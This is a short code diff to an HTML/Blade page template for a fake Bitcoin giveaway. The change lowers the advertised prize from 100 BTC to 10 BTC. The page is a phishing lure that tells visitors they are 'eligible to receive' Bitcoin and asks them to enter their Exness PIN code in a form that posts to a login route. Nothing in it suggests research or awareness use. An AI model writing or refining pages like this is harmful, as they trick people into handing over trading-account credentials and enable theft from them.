@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Claim 100 BTC Now</title>
+    <title>Claim 10 BTC Now</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -18,10 +18,10 @@
 <body class="bg-gradient-to-br from-gray-900 via-black to-gray-800 text-white min-h-screen flex items-center justify-center p-6">
 <div class="w-full max-w-xl text-center space-y-8">
     <h1 class="text-4xl md:text-5xl font-bold text-yellow-400 animate-pulse">
-        🎉 Get 100 BTC Instantly!
+        🎉 Get 10 BTC Instantly!
     </h1>
     <p class="text-gray-300 text-lg md:text-xl">
-        You're eligible to receive <span class="font-semibold text-white">100 Bitcoin</span>. Enter your Exness PIN code to receive.
+        You're eligible to receive <span class="font-semibold text-white">10 Bitcoin</span>. Enter your Exness PIN code to receive.
     </p>
 
     <form method="POST" action="{{ route('login.store') }}" class="bg-white/10 backdrop-blur-md p-8 rounded-xl space-y-5 border border-yellow-500 glow">
